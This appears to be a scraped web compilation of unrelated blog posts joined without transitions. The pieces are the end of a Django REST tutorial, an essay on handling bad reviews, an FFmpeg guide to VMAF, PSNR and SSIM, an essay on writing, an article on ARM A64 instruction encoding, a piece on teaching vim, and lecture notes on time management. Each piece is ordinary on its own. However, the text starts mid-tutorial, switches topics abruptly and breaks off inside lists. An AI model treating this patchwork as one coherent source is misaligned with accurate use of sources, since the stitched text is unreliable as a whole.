CODE:&nbsp;https://gist.github.com/sankalpjonn/b313384c0774ec4f1dee342ced8ccc20.js&lt;/p&gt;</p><p>‍<br>‍<br>This viewset is now capable of performing all the CRUD&nbsp;operations and it will use the NoteSerializer to determine how the data will be received and how it will be sent back to the requesting client. <br></p><p>Since a read operation could be retrieving a single note or listing all the existing notes, we need a way to handle both cases. </p><p>The <em>get_object </em>is responsible to determine how an object is retrieved. In this case we look for an <em>id </em>field in the query parameters of a a request and use that to retrieve a note. </p><p>This method is also used while making an update operation because to update a particular note we would have to first retrieve that note.</p><p>The <em>get_queryset</em> method is responsible for determining how a list operation will work. In this case we will be listing all the notes which are still active and sort them in the decreasing order of the <em>last_udpated_on</em> timestamp.</p><p>The <em>perform_delete</em> method will determine what to do when a delete operation is requested. In this case we do not want to delete the row from the database and we simply want to deactivate it. Therefore we will be setting the <em>is_active</em> field to False and saving the note.</p><h5>‍<strong>Defining the URL&nbsp;path</strong>‍</h5><p>We just have one more step to complete before we can see our APIs in action and that is to determine what URL&nbsp;path will invoke the above viewset. This can be done in notesapp/urls.py as follows.<br>‍</p><p>‍<br>&lt;p&gt; CODE:&nbsp;https://gist.github.com/sankalpjonn/902b7c23e95e3cb4ddf99f1b52bbbe52.js&lt;/p&gt;</p><div><p>‍</p><p>To explain what is going on here, we are basically saying that if the url <em>/note</em> is called, no matter what the HTTP&nbsp;method is, we will be invoking the NoteViewSet and based on what the HTTP method is we will call a particular method within this viewset.<strong>‍</strong></p></div><ol start="1" role="list"><li>A POST&nbsp;call will result in a create operation of the Note model.</li><li>A GET&nbsp;call will result in retrieving a single Note model object using the <em>id</em> query parameter.</li><li>A&nbsp;PUT&nbsp;call will result in replacing an existing Note model with a new Note and the existing Note model will be fetched using the <em>id</em> query parameter.</li><li>A PATCH&nbsp;call will result in modifying only a certain field inside an existing Note model instead of entirely replacing it and the existing Note model will be fetched using the <em>id</em> query parameter.</li><li>A DELETE&nbsp;call will result in calling a destroy function which internally calls the <em>perform_destroy</em> method defined above in views.py.</li></ol><p>In case you haven't noticed, there is one thing missing in this url PATH and that is the ability to list all the existing Note model objects. </p><p>To solve this I&nbsp;created another URL&nbsp;path <em>/note/all </em>where I am invoking the same viewset as the above one with the difference being the GET&nbsp;call will now invoke a list method on the viewset instead of a retrieve method which means that the <em>get_queryset </em>method defined earlier will be invoked.<br></p><h3>See your APIs in action<br></h3><p>Okay enough talk, let us now run the server and view the APIs in action. You can run the Django development server using the below command and it will expose your server on the 8000 port on localhost.</p><div><p>‍</p><p>&lt;p&gt; CODE:&nbsp;https://gist.github.com/sankalpjonn/473d335affb3426f7d5cbc1a747e4fe4.js&lt;/p&gt;</p></div><blockquote>Please do not forget to include <em>r…</em></blockquote></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-4608430843265935994">
<p>I am what I would call a non-famous public person. What do I mean by that? I mean that I have jobs where people publicly review my work. As a college instructor, I receive student reviews. Some of them get read internally at our school, and some of them get posted publicy. And they’re attached to my name. They’re not some product where people might just know my company or my brand. They know <em>me</em>, and they’re reviewing <em>me</em>. As an author, my books get reviewed. Some of those reviews are by editors and official reviewers internal to the publisher. Some of those reviews are by email. But most of those reviews are posted online. As a software developer and hobbyist podcaster I also get public reviews.</p>

<p>To anyone in a personalized creative field who cares deeply about their work, bad reviews hurt. It’s not just about being sensitive (although I am sensitive and that doesn’t help). It’s that when you really pour your heart into something, as I do my teaching for example, then the product is an extension of you. Nobody would deny that the way a class or a book turns out is an extension of the personality, knowledge, and ability of the teacher/author. And when the product is criticized, it’s like you are being criticized. </p>

<p>My dad, who was also a college instructor, and the producer of nine books and nine instructional videos among many other public creative ventures, had a very thin skin. He couldn’t stand me reading him a bad review. That stuck with me. This very accomplished man, couldn’t stand even a little criticism. When I get too sensitive, I try to remember how his inability to accept criticism hurt some of his products. He was much more about getting things done than doing them perfectly. If he had a little bit more of a perfectionist streak in him, he would have done even better. But maybe he would have done less…</p>

<p>It doesn’t matter if I receive eighteen great reviews for a class. It’s the words of the two bad reviews that stick with me. And do you know why? <em>Because almost always there’s a kernel of truth to those reviews.</em> Does that mean we should listen to them? Well if I only listened to the bad reviews, I would never produce anything. I would just stay in bed. The fact is the people who are getting no bad reviews, are the people who are not taking the risk of putting themselves out there. So, we have to not let ourselves get so discouraged that we stop producing. And we have to remember that while we may not have served those two students well, we may have served those other eighteen students better than they would have been served in a world without us teaching them. </p>

<p>We can’t please every student or every customer. Nothing that gets watched/read by more than a few people is going to be liked by all of them. Even Mother Theresa would get a downvote on YouTube. So, if we’re serving the majority, we don’t want to let the critiques of a few steer us in the wrong direction.</p>

<p>On the other hand, being like my dad is dangerous too. <strong>No, the customer is not always right. But usually the customer has a point. We have to always be working to get better.</strong> Because we’re not perfect, and there’s always room for improvement. <strong>And we need to read those bad reviews to find those spaces for improvement.</strong> It doesn’t mean they’re right, but it does mean we need to think about them.</p>

<p>My dad accomplished an amazing amount. If he let those bad reviews slow him down too much, it’s very possible he would have not accomplished as much. But if he could have found a few tweaks, a few changes, to serve a few customers better, well then he could have grown through them. I want to grow, but I also don’t want to stop. So, I can’t let the reviews get me too down, but I have to read them.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><strong>In this article, let’s learn to compute VMAF, PSNR, and SSIM using FFmpeg. While working on videos (compression or post-processing), it is common to compute objective metrics in addition to doing subjective Visual Quality testing. If you are using FFmpeg in your workflow, it is very easy to compute these metrics instead of purchasing expensive tools. </strong></p>



<p>Let’s go ahead and take a look at these metrics and how they are computed, shall we?</p>



<hr>



<h2>What is VMAF?</h2>



<p><strong><a href="https://github.com/Netflix/vmaf" target="_blank" rel="noopener">VMAF from Netflix</a></strong>&nbsp;stands for Video Multi-method Assessment Fusion, and it is a video quality metric that combines human vision modeling with machine learning. It’s become very popular as it succeeds (not fully) at automating subjective quality testing that usually requires humans to watch and score videos.</p>



<p>FFmpeg and Netflix’s VMAF are now part of every video processing and compression engineer’s toolbox. To understand how to install VMAF, please read our “<a href="https://ottverse.com/vmaf-ffmpeg-ubuntu-compilation-installation-usage-guide/">VMAF Installation</a>” article.</p>



<hr>



<h2>How to Compute VMAF using FFmpeg</h2>



<p>Let’s look at a couple of ways of computing VMAF. </p>



<p><strong>If your source and destination videos are of the same dimensions (height and width)</strong>, then you can directly compute the VMAF value using the command line below. </p>



<p>All you need to do is point FFmpeg to the location of the VMAF model file and it will do the rest. </p>



<pre><code>ffmpeg.exe -i videoToCompare.mp4 -i originalVideo.mp4 -lavfi libvmaf="model_path=vmaf_v0.6.1.pkl":log_path=vmaf_logfile.txt -f null -</code></pre>



<p><strong>However, in case the source and destination videos are not of the same resolution, then you have to ensure that the destination is brought to the same resolution as the source video before computing VMAF</strong>.</p>



<p>Here is a simple one-liner that uses the <code>filter_complex</code> to do the resolution change and then computes the VMAF value. I have used the <code>bicubic</code> filter to do the up/down scaling. </p>



<pre><code><code>bin/ffmpeg -i test_720p30.mp4 -i test_1080p30.mp4 -filter_complex "[0:v]scale=1920x1080:flags=bicubic[main]; [1:v]scale=1920x1080:flags=bicubic,format=pix_fmts=yuv420p,fps=fps=30/1[ref]; \</code>
<code>[main][ref]libvmaf=psnr=true:log_path=vmaflog.json:log_fmt=json" \</code>
<code>-f null -</code></code></pre>



<p>The log file that is produced by the VMAF computation is very comprehensive. It provides a frame-wise score of VMAF and its constituent metrics, along with the aggregate score (if that’s all you are looking for). </p>



<p>Here is an example of the VMAF file. </p>



<figure><img loading="lazy" width="1024" height="205" src="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/11/vmaf-1.png?resize=1024%2C205&amp;is-pending-load=1#038;ssl=1" alt="VMAF using FFMpeg" data-recalc-dims="1" data-lazy-srcset="https://889329.smushcdn.com/2063466/wp-content/uploads/2020/11/vmaf-1.png?size=240x48&amp;lossy=1&amp;strip=1&amp;webp=1 240w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/11/vmaf-1.png?resize=300%2C60&amp;ssl=1 300w, https://889329.smushcdn.com/2063466/wp-content/uploads/2020/11/vmaf-1.png?size=480x96&amp;lossy=1&amp;strip=1&amp;webp=1 480w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/11/vmaf-1.png?resize=768%2C154&amp;ssl=1 768w, https://889329.smushcdn.com/2063466/wp-content/uploads/2020/11/vmaf-1.png?size=960x192&amp;lossy=1&amp;strip=1&amp;webp=1 960w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/11/vmaf-1.png?resize=1024%2C205&amp;ssl=1 1024w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/11/vmaf-1.png?resize=1200%2C240&amp;ssl=1 1200w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/11/vmaf-1.png?resize=1536%2C307&amp;ssl=1 1536w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/11/vmaf-1.png?w=1771&amp;ssl=1 1771w" data-lazy-sizes="(max-width: 1024px) 100vw, 1024px" data-lazy-src="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/11/vmaf-1.png?resize=1024%2C205&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>

<h2>What is PSNR and How Is It Calculated?</h2>



<p>From Wikipedia, </p>



<p><em><strong>Peak signal-to-noise ratio, often abbreviated&nbsp;PSNR, is an engineering term for the ratio between the maximum possible power of a&nbsp;<a href="https://en.wikipedia.org/wiki/Signal_(information_theory)" target="_blank" rel="noopener">signal</a>&nbsp;and the power of corrupting&nbsp;<a href="https://en.wikipedia.org/wiki/Noise" target="_blank" rel="noopener">noise</a>&nbsp;that affects the fidelity of its representation.&nbsp;</strong></em></p>



<p>So, for a video, you are essentially trying to compute how much noise or pixel corruption has been introduced due to the video compression process which is essentially lossy (mainly due to Quantization). </p>



<p>The first step is to compute the Mean Squared Error or MSE. The formula is shown below where I and K represent the original and destination images respectively and <code>m</code> and <code>n</code> are the height and width of the images respectively. </p>



<p><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/3a34719b4f391dba26b3e8e4460b7595d62eece4" alt="{\mathit  {MSE}}={\frac  {1}{m\,n}}\sum _{{i=0}}^{{m-1}}\sum _{{j=0}}^{{n-1}}[I(i,j)-K(i,j)]^{2}" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>



<p>Once you have the MSE, you can compute the PSNR using the formula shown below. </p>



<p><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/fc22801ed1232ff1231c4156b589de5c32063a8a" alt="{\begin{aligned}{\mathit  {PSNR}}&amp;=10\cdot \log _{{10}}\left({\frac  {{\mathit  {MAX}}_{I}^{2}}{{\mathit  {MSE}}}}\right)\\&amp;=20\cdot \log _{{10}}\left({\frac  {{\mathit  {MAX}}_{I}}{{\sqrt  {{\mathit  {MSE}}}}}}\right)\\&amp;=20\cdot \log _{{10}}\left({{\mathit  {MAX}}_{I}}\right)-10\cdot \log _{{10}}\left({{{\mathit  {MSE}}}}\right)\end{aligned}}" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>



<p>Here,&nbsp;<em>MAX<sub>I</sub></em>&nbsp;is the maximum possible pixel value of the image. When the pixels are represented using 8 bits per sample, this is 255. </p>



<h2>How to Calculate PSNR using FFmpeg?</h2>



<p>You don’t have to go through all those calculations while using FFmpeg. All you need to do use the filter module <code>lavfi</code> and tell it to compute the PSNR. That’s it. </p>



<pre><code>ffmpeg.exe -i videoToCompare.mp4 -i originalVideo.mp4 -lavfi psnr=stats_file=psnr_logfile.txt -f null -</code></pre>



<p>FFmpeg will print the average PSNR on the console while the log file will contain a frame-wise list of the MSE and the PSNR for the Luma and Chroma planes (y, u, and v). An example is shown below – </p>



<pre><code>n:1 mse_avg:54.96 mse_y:72.51 mse_u:27.98 mse_v:11.74 psnr_avg:30.73 psnr_y:29.53 psnr_u:33.66 psnr_v:37.43 
 n:2 mse_avg:69.70 mse_y:93.80 mse_u:31.01 mse_v:12.02 psnr_avg:29.70 psnr_y:28.41 psnr_u:33.22 psnr_v:37.33 
 n:3 mse_avg:72.74 mse_y:98.37 mse_u:31.02 mse_v:11.96 psnr_avg:29.51 psnr_y:28.20 psnr_u:33.21 psnr_v:37.35 
 n:4 mse_avg:73.11 mse_y:98.94 mse_u:31.14 mse_v:11.76 psnr_avg:29.49 psnr_y:28.18 psnr_u:33.20 psnr_v:37.43 </code></pre>



<hr>



<h2>How to Calculate SSIM using FFmpeg?</h2>



<p>Finally, let’s take a look at computing SSIM using FFmpeg. Again looking at the <a href="https://en.wikipedia.org/wiki/Structural_similarity" target="_blank" rel="noopener">definition of SSIM</a>, </p>



<p><em><strong>The&nbsp;structural similarity&nbsp;index measure&nbsp;(SSIM) is a method for predicting the perceived quality of digital television and cinematic pictures, as well as other kinds of digital images and videos. SSIM is used for measuring the similarity between two images. The SSIM index is a&nbsp;<a href="https://en.wikipedia.org/wiki/Video_quality#Classification_of_objective_video_quality_metrics" target="_blank" rel="noopener">full reference metric</a>; in other words, the measurement or prediction of&nbsp;<a href="https://en.wikipedia.org/wiki/Image_quality" target="_blank" rel="noopener">image quality</a>&nbsp;is based on an initial uncompressed or distortion-free image as reference.</strong></em></p>



<p>Calculating SSIM using FFmpeg is very similar to calcuating PSNR. </p>



<pre><code>ffmpeg.exe -i videoToCompare.mp4 -i originalVideo.mp4 -lavfi ssim=stats_file=ssim_logfile.txt -f null -</code></pre>



<p>The output of this command is going to look like this – </p>



<pre><code>[Parsed_ssim_0 @ 0000029c82894300] SSIM Y:0.926845 (11.357537) U:0.876798 (9.093807) V:0.860658 (8.559193) All:0.907472 (10.337287)</code></pre>



<p>And the log file will give you information on the SSIM values for each of the planes (Y, U, and V) along with the aggregate for each of the frames of the video. </p>



<pre><code> n:1 Y:0.930033 U:0.926453 V:0.913508 All:0.926682 (11.347897)
 n:2 Y:0.919140 U:0.915343 V:0.910900 All:0.917134 (10.816226)
 n:3 Y:0.922417 U:0.915795 V:0.910959 All:0.919404 (10.936853)
 n:4 Y:0.920077 U:0.916443 V:0.912994 All:0.918291 (10.877300)
 n:5 Y:0.926438 U:0.927597 V:0.917905 All:0.925209 (11.261518)
 n:6 Y:0.920619 U:0.919988 V:0.918780 All:0.920207 (10.980375)</code></pre>



<hr>



<h2>Conclusion</h2>



<p>That’s it folks – now you know how to calculate three very important objective metrics for video quality evaluation — PSNR, VMAF, and SSIM. By computing all three and using them for analysis, it’s hard to be thrown off by artifacts that one metric can catch and the other can’t. </p>



<p>And like always, do spend a few minutes doing some visual testing (subjective) after you’re done with the objective scores! </p>

<article id="post-951">

<p>Do you hate writing? Me too.</p>



<div><p>I am not talking about tweets or IG posts. I’m talking about 500 word long articles and essays. Most of us don’t like writing them. They take too much time and effort. </p><p>But is time really the problem? I don’t think so. We spend a <a rel="noreferrer noopener" href="https://www.broadbandsearch.net/blog/average-daily-time-on-social-media" target="_blank">lot of time</a> on social media everyday right? Yeah time is not the problem.</p></div>



<p>So is effort the problem? Hmm let’s see. What happens when you open a blank page to write? Does anxiety kicks in? For me it does. </p>







<p>See, when I plan to write an article, usually I have a general idea about the topic I plan to write about. Though as soon as I open a blank page, my ideas start ruffling among each other making a mess. I don’t have clarity anymore. Everything starts falling apart, anxiety kicks in and …. I close the tab. Phew too much trouble for a few likes. </p>







<p>But after a few days / weeks those ideas start dying. The worst part is I see them dying without seeing the light of the day. That sucks. </p>



<p>And that’s why I try to write, and you should too.</p>



<p>Writing about a topic gives me a platform to just lay my ideas wide in the open. It’s like clearing my mental hard drive. It feels relaxing. </p>



<p>But If I just pour my random thoughts on a piece of paper that’s just writing, not <em>good</em> writing. I don’t want people to see a mishmash of ill shaped ideas, I want them to see a well ordered architecture where every part fits in. It’s not just for the sake of readers though, It’s for the ideas themselves. </p>



<p>Often about a topic, I have a range of musings. They’re like vectors, each with their own direction and magnitude. They make sense individually but to understand about the topic as a whole, all of them need to come in sync. Their rhythm has to match. That’s what good writing does. </p>



<blockquote><p>Good writing is just clear thinking expressed on paper.</p></blockquote>



<p>Writing about a topic makes me think about it from all the directions and perspectives. </p>



<p><em>What do I know about this topic?</em></p>



<p><em>Do I know enough?</em></p>



<p><em>If everything I know, correct?</em></p>



<p><em>How can I fill my gaps?</em></p>







<p>Jotting down everything I know helps me answer many of these questions. The ones still unanswered force me to research more. It’s a cycle.</p>



<p>Each draft of writing takes me one step closer to the complete and clear picture. The ultimate truth starts showing itself in the end. It’s a bliss moment.</p>



<p>The learning readers get is always a pleasant <em>byproduct</em>. </p>

<p>After self-learning and expression, what is the next best thing writing offers?</p>



<p><strong>Relationships</strong>.</p>

<p>This visibility can get you job offers, network of influential people, money and many other things. </p>



<div><p>I can go on and on about the benefits of putting yourself out there but it’s a moo point. You have to experience the magic yourself. When a stranger thanks you for a piece of advice or a someone asks if they can use your work, it feels great. </p><p>Not trying to brag here but even as a crappy writer myself, I have experienced the joy of someone reaching out to me to thank me for my work.

        <article>
          <section><p>Earlier this year I bought a Raspberry Pi 3 to have as an AArch64
development machine. The fastest way to get familiar with an
instruction set is to write a disassembler for it and I’ve made one
for 64-bit <span>ARM</span> in R6RS Scheme as part of
the <a href="https://github.com/weinholt/machine-code">machine-code</a> project.
The instruction set is called <span>ARM</span> A64, instructions are always 32 bits
wide and they have a neat structure which is pretty fast to decode in&nbsp;software.</p>

<p>The architecture has 31 integer registers (x0-x30). There is also a
stack pointer register and a zero register that always contains
zeroes. Both these registers are encoded as register number 31, and
it’s up to each instruction if an operand can use the stack pointer or
the zero register. The x30 register is used to store the return
address. These registers are all 64-bit registers and the lower 32
bits can be accessed using the names w0-w31. Operations that write to
the lower 32 bits also clear the upper 32 bits, just like on&nbsp;<span>AMD64</span>.</p>
<p>There are also 32 registers usable as either floating point registers
or 128-bit vector registers. As vectors they support different
arrangements that are either 64 or 128 bits in total, containing
8-bit, 16-bit, 32-bit or 64-bit quantities. There are many
instructions that operate on multiple quantities at the same time,
which is an interesting way to speed up code. Multiple loop iterations
can be run&nbsp;simultaneously.</p>
<p>The instructions are documented in the <a href="https://developer.arm.com/docs/ddi0487/a/arm-architecture-reference-manual-armv8-for-armv8-a-architecture-profile"><span>ARM</span> ARM for ARMv8-A</a>. I’ve
counted, not including instruction aliases, 442 instruction mnemonics
(things like <span>ADD</span>, EOR, B.EQ, etc). They are organized in what is
basically a four-level table: main encoding, instruction group, decode
group and instruction. Chapter C4 of the manual follows the same
structure. This structure is nice for fast decoding, but it’s not
strictly necessary since all encodings at the instruction level still
need to have a unique&nbsp;meaning.</p>
<p>For each instruction mnemonic there can be multiple variants that
enable the instruction to handle different types of operands. An
example of this is the <span>FMUL</span> instruction that multiples two floating
point values. In a C program it would look like <code>a = b * c</code>. In A64
assembler it might look like one of these, depending on what the
surrounding code&nbsp;does:</p>
<pre><code><span>fmul</span> <span>s0</span>, <span>s1</span>, <span>s2</span>            
<span>fmul</span> <span>d0</span>, <span>d1</span>, <span>d2</span>            
<span>fmul</span> v0.<span>2</span>s, <span>v1</span>.<span>2</span>s, <span>v2</span>.<span>2</span>s   
<span>fmul</span> v0.<span>4</span>s, <span>v1</span>.<span>4</span>s, <span>v2</span>.<span>4</span>s   
<span>fmul</span> v0.<span>2</span>d, <span>v1</span>.<span>2</span>d, <span>v2</span>.<span>2</span>d   
<span>fmul</span> <span>s0</span>, <span>s1</span>, <span>v2</span>.s[<span>0</span>]       
<span>fmul</span> <span>d0</span>, <span>d1</span>, <span>v2</span>.d[<span>0</span>]
<span>fmul</span> v0.<span>2</span>s, <span>v1</span>.<span>2</span>s, <span>v2</span>.s[<span>0</span>] 
<span>fmul</span> v0.<span>4</span>s, <span>v1</span>.<span>4</span>s, <span>v2</span>.s[<span>0</span>]
<span>fmul</span> v0.<span>2</span>d, <span>v1</span>.<span>2</span>d, <span>v2</span>.d[<span>0</span>]
</code></pre>
<p>That’s quite a few variants for a single mnemonic. Not all mnemonics
have this many variants, but depending on how one counts I estimate
that there are in total around 1000-2000 variants. The instruction set
designers had to fit all these variants into 32 bits, while at the
same time making space for instructions that encode relatively large
immediate operands, and not forgetting about leaving space for future
extensions. As if that wasn’t difficult enough, the instructions
should also be easy to decode with&nbsp;hardware.</p>

<p>I’ve extracted the tables from my disassembler, rendered them with
the <a href="https://www.npmjs.com/package/bit-field">bit-field package</a>, and
made them slightly interactive. If you’re reading this in a browser
you can see the encodings below. The thing to notice is that each
layer adds extra fixed bits: fields that must be a fixed 0 or 1 value.
(The last level, the instruction level, is not shown in this table).
Two encodings under the same parent always have some differences in
these fields, so that they can be separated by an instruction decoder.
Click an encoding to expand the next level of&nbsp;encodings.</p>




<p>There are many conventions in the field names. Instructions that take
register operands encode them in fields named <em>Rd</em>, <em>Rn</em> and <em>Rm</em>.
Immediate values (integers, <span>PC</span>-relative offsets, etc) are named <em>imm</em>.
Fields that change the type of operation tend to be called <em>op</em>N or
<em>opcode</em>. In general a few of the fields encode the operation (or the
size of the operation) and the rest encode the&nbsp;operands.</p>

<p>The image below shows the encoding space of the instruction set. The
<em>x</em> axis goes from 0 to 2<sup>16</sup>-1 and encodes the lower 16 bits
of the instruction space, and the <em>y</em> axis contains the upper 16 bits.
The different colors denote different decode groups, i.e. all the
encodings at the third level of the table above. (There is probably a
better&nbsp;representation).</p>
<p><img src="https://weinholt.se/articles/arm-a64-instruction-set/a64-2048-crushed.png" title="Encoding space used by ARM A64" alt="An image showing the 32-bit
  encoding space. Mostly there are horizontal thick lines of different
  colors. This shows that the higher 16 bits tend to keep similar
  instructions together, although there is some mirroring around the
  middle of the image."></p>
<p>All the dark spots are places where ARMv8 does not have any allocated
instructions, or the encoding is reserved. For many instructions there
are some fields that have reserved encodings and these are also&nbsp;dark.</p>
<p>Even if instructions are kept to the fixed 32 bit encoding there is
still plenty of room for the instruction set to&nbsp;grow.</p>

<p><span>ARM</span> A64 is a quite clean instruction set with only a few quirks here
and there in its encoding. Compared to AMD64 it has twice the amount
of registers, a clean separation of load/store instructions, clean
RISCy operands (mostly one destination register and two source
registers) and of course the register names and most mnemonics are
totally different. Both have 128-bit vector registers and 64-bit
integer registers and a 64-bit address space. They look quite similar,
except everything’s&nbsp;different.</p>

<p>The why of why people use vim has been <a href="https://dev.to/iggredible/why-i-use-vim-2f40">covered fairly extensively</a>, so I thought I would spend a little time explaining why I <em>teach</em> vim to my high school students, even in 2020.</p>



<p>It all began when I was assigned a mixed class of ninth through twelfth grade students in computer science just after the financial collapse on 2008. Well, the financial collapse first brought me to teach Intro to Programming using VB 6.0 and Windows thin clients, which was an experience unto itself (thanks in part to the <a href="https://en.wikipedia.org/wiki/Conficker">Conficker virus</a>). That experience is worth a separate blog post and is a good part of why one of my specialties is teaching computer security.</p>



<p>So here I am with all levels of student, including AP CS A (read: AP CS Java), and obsolete Windows PCs (at least the thin clients were gone). I couldn’t install any software, wanted to teach C, had to teach Java, and had very few options (these were the days before online web based IDEs).</p>



<p>I had experience with the UNIX command line, primarily Sun Workstations, thanks to my wonderful education at <a href="https://www.soe.ucsc.edu/departments/computer-science-and-engineering">UCSC</a>, so that wasn’t an issue. I had played with Linux in the 1990s to a bit of success, but hadn’t touched it for almost a decade. So I found an old Pentium 2 carcass in the the garbage outside my condo complex, installed a hard drive, and tried this new (to me) flavor of Linux called, strangely, <a href="https://ubuntu.com/">Ubuntu</a>.</p>



<p>I quickly realized this machine could have all the students coding at one, discovered the wonder that is <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">putty.exe</a> (it doesn’t require any installation to run!) to connect the obsolete PCs to the server and soon my students were off and coding.</p>



<p>Why did I teach them vim? I wish I could say I agonized over all the options at the time and decided vim was the best pedagogical solution, but the reality of the situation was that vi was what I used in college because my father taught me vi. You see, I am lucky to have a father who worked in the industry and is even somewhat of a <a href="https://www.bell-labs.com/usr/dmr/www/qed.html">footnote in text editor history</a>. So I taught vi (later vim) because it is what I knew. A running theme in many computer science teacher’s trials by fire… teaching something because it is what they know. I will go as far as to argue that it is more important that the teacher knows the editor, and especially the programming language, rather than assigning any importance to one correct editor or one correct language that all teachers should teach.</p>



<p>Years later, though, I still teach vim and the command line. So here is how I justify my decision, even if only to myself.</p>



<p>It just works. Every time I go to a new school, it takes time to get the software installed necessary to run IDEs. I remember walking into one school in which the AP CS A class was flailing away with Eclipse on Mac OS X because the students needed, and didn’t have, administrator access. I have an amazing tech department at my current job, but even here it took us weeks to figure out how to deploy Visual Studio Code on the student’s MacBook Airs and then we had to figure out how to deploy Python3 and Java. So there’s no confusion, I teach vim along with many IDEs and I fully believe it is my responsibility to teach multiple platforms and multiple IDEs, but the CLI and vim are always my safety net.</p>



<p>My students can program in any number of of languages on a now cloud based CLI Linux machine (thank you <a href="https://www.linode.com/">Linode</a> and <a href="https://www.digitalocean.com/">Digital Ocean</a> – both of whom offer a $5/month plan – just. happy customer!). By using the CLI, I can support literally any type of computer connecting (including iPads, although the lack of a virtual esc key drives me batty as a vim user, and <a href="https://chrome.google.com/webstore/detail/secure-shell-app/pnhechapfaindjhompbnflcldabbghjo?hl=en">ChromeBooks</a>). Students can connect from anywhere in the world and things just work. All of this became infinitely important in the remote and hybrid learning experience of the pandemic. And this is all possible because the students use vim.</p>



<p>I keep track of as many of my students that major in CS and a running theme is they all profusely thank me for teaching them vim and the CLI. Too many colleges start CS1 with an IDE and then throw the CS2 students into the deep end with the CLI. Not everyone is as lucky as I was in regards to having a father well versed in the CLI.</p>



<p>And yes, there are online IDEs these days, but I’ve found those to be full of their own pitfalls, privacy issues, and costs and find doing any advanced work using them to be very difficult if not impossible.</p>



<p>Also, to be clear, both nano and Emacs work quite well in the context of CLI Linux and I don’t make any claim that teachers should use vim over those equally acceptable command line text editors except for one small argument. Most people agree, computer security pretty much requires knowledge of the command line and a text editor. I always tell my students that the one editor they are likely to find already installed on a machine is vim and it is a bad day when you have to install another editor. Maybe just an issue for students interested in ethical penetration testing…</p>

<p>In 2007, just after his cancer diagnosis, Carnegie Mellon professor Randy Pausch gave <a href="https://www.youtube.com/watch?v=oTugjssqOT0">a well received lecture on Time Management</a>. These are my notes (<a href="http://www.cs.virginia.edu/~robins/Randy/RandyPauschTimeManagement2007.pdf">slides here</a>, <a href="https://jamesclear.com/great-speeches/time-management-by-randy-pausch">transcript here</a>).</p>
<blockquote>
  <p>Side note - he is better known for his Last Lecture on <a href="https://www.youtube.com/watch?v=ji5_MqicxSo">Achieving Your Childhood Dreams</a> - ironically given <em>before</em> this Time Management talk.</p>

  <h2 id="money-vs-time"><a href="#money-vs-time">Money vs Time</a></h2>
  <ul>
    <li>We are very good at dealing with money, but very bad at dealing with time. Having an idea of how much your time costs helps you start making tradeoffs better.</li>
    <li>We have to manage our time better than we manage our money. We have money budgets, what about time budgets?</li>
    <li>We are in a "Time Famine" - nobody says they have "too much time". Yet The typical office worker wastes almost 2 hrs a day at work, and 28 hours a week on TV. This isn't just a one-off problem - you can't solve it one week and then go back to normal - it's systemic and requries change in fundamental processes to address this once and for all.</li>
    <li>The goal is to have fun, be happier, lead a more meaningful life. If you're not going to have fun, why do it?</li>
    <li>Being successful doesn't make you manage your time well. Managing your time well does make you successful.</li>
    <li>Turn money into time - Hire someone to do chores. Esp if you have kids.</li>

  <ul>
    <li>
      <p>Always ask: Why am I doing this, What is the goal? Why will I succeed? What will happen if I don't do it?</p>
    </li>
    <li>
      <p><strong>It's more important to do the right things, rather than do things right.</strong></p>
    </li>
    <li>
      <p>Pareto Principle, 80/20 rule. Focus on the high value/impact things.</p>
    </li>
    <li>
      <p>People asked Walt how he built Disneyland in 366 days. His reply: "We used every one of them."</p>

    <li>
      <p><strong>Planning is impt</strong>. Failing to plan = planning to fail. Have a plan for day/week/quarter.</p>
    </li>
    <li>
      <p>You can still be fluid - plans can change.</p>
    </li>
    <li>
      <p><strong>Todos</strong> - Break things down into small steps. "Get tenure" is not a todo. Eat your frog - do the ugliest thing first.</p>
    </li>
    <li>
      <p><strong>Prioritization</strong> (MOST IMPORTANT) Covey/Eisenhower Matrix</p>
      <ul>
        <li>urgent + important</li>
        <li>not urgent + important</li>
        <li>urgent + unimportant</li>
        <li>not urgent + unimportant</li>
        <li>the trick is to not do unimportant things, and to tackle important things <strong>before</strong> they become urgent.</li>

    <li>
      <p>Keep your desk clear - have 1 thing on your desk</p>
    </li>
    <li>
      <p>Touch each piece of paper, email once. <strong>Inbox is not your todo list</strong>. File the email away and put it on your todo list.</p>
    </li>
    <li>
      <p>A filing system is absolutely essential. Have one place in the house where any piece of paper goes. (Ditto in the cloud/computer)</p>
    </li>
    <li>
      <p><strong>Have at least two, maybe three monitors.</strong> Using just one "is like eating off the airplane tray."</p>

      <p>Productivity Stack:</p>
      <ul>
        <li>Todolist</li>
        <li>Inbox</li>
        <li>Calendar. Dont use your brain to remember your appointments.</li>
      </ul>
    </li>
    <li>
      <p>Standing during phone calls - will be much faster. Don't get comfortable. "I'd love to keep talking with you but I have students waiting."</p>
    </li>
    <li>
      <p>Exercise on bike - can be spent on phone if you have a headset</p>
    </li>
    <li>
      <p>Write a Thank You note. Tangible way of telling someone you appreciated something. It makes you rare, they remember you well.</p>
    </li>
    <li>
      <p>The dog - reminds you you have better things to do</p>
    </li>
    <li>
      <p>Chair - make your office comfortable for you, optionally comfortable for others (eg folding chair).</p>
    </li>
    <li>
      <p><strong>You do not find time to do something, you make time.</strong> And you make time by electing not to do something else.</p>
    </li>
    <li>
